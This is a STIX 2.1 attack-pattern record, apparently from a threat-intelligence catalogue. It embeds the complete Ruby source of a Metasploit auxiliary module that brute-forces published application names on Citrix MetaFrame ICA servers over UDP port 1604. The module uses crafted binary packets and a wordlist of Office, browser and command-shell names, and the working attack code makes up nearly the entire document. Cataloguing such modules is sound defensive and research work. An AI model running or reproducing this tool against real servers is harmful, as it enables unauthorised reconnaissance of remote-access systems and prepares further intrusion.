{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b371328d-7d5e-47e6-ba91-0505e58012b2",
    "created": "2024-08-14T16:32:24.436387Z",
    "modified": "2024-08-14T16:32:24.436392Z",
    "name": "Citrix MetaFrame ICA Published Applications Bruteforcer",
    "description": " This module attempts to brute force program names within the Citrix Metaframe ICA server. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/citrix_published_bruteforce.rb",
            "external_id": "citrix_published_bruteforce.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Udp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Citrix MetaFrame ICA Published Applications Bruteforcer',\n      'Description'    => %q{\n        This module attempts to brute force program names within the Citrix\n        Metaframe ICA server.\n      },\n      'Author'         => [ 'aushack' ],\n      'References'     =>\n        [\n          [ 'OSVDB', '50617' ],\n          [ 'BID', '5817' ]\n        ]\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(1604),\n      ])\n  end\n\n  def autofilter\n    false\n  end\n\n  def run\n    connect_udp\n\n    print_status(\"Attempting to contact Citrix ICA service...\")\n\n    # Client NetBIOS hostname. This works fine >:)\n    client = Rex::Text.rand_text_alphanumeric(8)\n\n    # Server hello packet\n    client_connect =\n      \"\\x1e\\x00\\x01\\x30\\x02\\xfd\\xa8\\xe3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" +\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n\n    # Server hello response\n    server_response =\n      \"\\x30\\x00\\x02\\x31\\x02\\xfd\\xa8\\xe3\\x02\\x00\\x06\\x44\"\n\n    applications = [\n      'TEST',\n      'NOTEPAD',\n      'ACROBAT READER',\n      'ACROBAR',\n      'EXPLORER',\n      'WORD',\n      'WORD2K',\n      'WORDXP',\n      'WORD2K3',\n      'WORD2K7',\n      'WORD 2000',\n      'WORD XP',\n      'WORD 2003',\n      'WORD 2007',\n      'WORD2000',\n      'WORD2003',\n      'WORD2007',\n      'EXCEL',\n      'EXCEL2K',\n      'EXCELXP',\n      'EXCEL2K3',\n      'EXCEL2K7',\n      'EXCEL 2000',\n      'EXCEL XP',\n      'EXCEL 2003',\n      'EXCEL 2007',\n      'EXCEL2000',\n      'EXCEL2003',\n      'EXCEL2007',\n      'ACCESS',\n      'ACCESS2K',\n      'ACCESSXP',\n      'ACCESS2K3',\n      'ACCESS2K7',\n      'ACCESS 2000',\n      'ACCESS XP',\n      'ACCESS 2003',\n      'ACCESS 2007',\n      'ACCESS2000',\n      'ACCESS2003',\n      'ACCESS2007',\n      'POWERPOINT',\n      'POWERPOINT2K',\n      'POWERPOINTXP',\n      'POWERPOINT2K3',\n      'POWERPOINT2K7',\n      'POWERPOINT 2000',\n      'POWERPOINT XP',\n      'POWERPOINT 2003',\n      'POWERPOINT 2007',\n      'POWERPOINT2000',\n      'POWERPOINT2003',\n      'POWERPOINT2007',\n      'OUTLOOK',\n      'OUTLOOKXP',\n      'OUTLOOK2K',\n      'OUTLOOK2K3',\n      'OUTLOOK2K7',\n      'OUTLOOK 2000',\n      'OUTLOOK XP',\n      'OUTLOOK 2003',\n      'OUTLOOK 2007',\n      'OUTLOOK2000',\n      'OUTLOOK2003',\n      'OUTLOOK2007',\n      'LOTUS',\n      'LOTUS NOTES',\n      'INTERNETEXPLORER',\n      'IE',\n      'IEXPLORER',\n      'FIREFOX',\n      'FIREFOX 3',\n      'NETSCAPE',\n      'NETSCAPE7',\n      'NETSCAPE6',\n      'MAIL',\n      'EMAIL',\n      'E-MAIL',\n      'INTERNET',\n      'CMD',\n      'COMMAND',\n    ]\n\n    # Citrix is publishing this application\n    application_valid =\n      \"\\x3e\\x00\\x02\\x35\\x02\\xfd\\xa8\\xe3\\x02\\x00\\x06\\x44\"\n    # Application not found / published\n    application_invalid =\n      \"\\x20\\x00\\x01\\x3a\\x02\\xfd\\xa8\\xe3\\x02\\x00\\x06\\x44\"\n\n    udp_sock.put(client_connect)\n    res = udp_sock.get(3)\n\n    if (res[0,server_response.length] == server_response)\n      print_status(\"Citrix ICA Server Detected. Attempting to brute force Published Applications.\")\n\n      applications.each do |application|\n\n        # Create the packet\n        packet = [52 + application.length].pack('C')\n        packet << \"\\x00\\x02\\x34\\x02\\xfd\\xa8\\xe3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n        packet << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x26\\x00\\x02\\x00\"\n        packet << [39 + application.length].pack('C')\n        packet << \"\\x00\\x00\\x00\\x00\\x00\"\n        packet << application\n        packet << \"\\x00\\x01\\x00\\x04\\x00\"\n        packet << client\n        packet << \"\\x00\"\n\n        udp_sock.put(packet)\n        res = udp_sock.get(3)\n\n        if (res[0,application_valid.length] == application_valid)\n          print_status(\"Found: #{application}\")\n        end\n\n        if (res[0,application_invalid.length] == application_invalid)\n          print_error(\"NOT Found: #{application}\")\n        end\n      end\n\n    else\n      print_error(\"Server did not respond.\")\n    end\n\n    disconnect_udp\n  end\nend\n"
}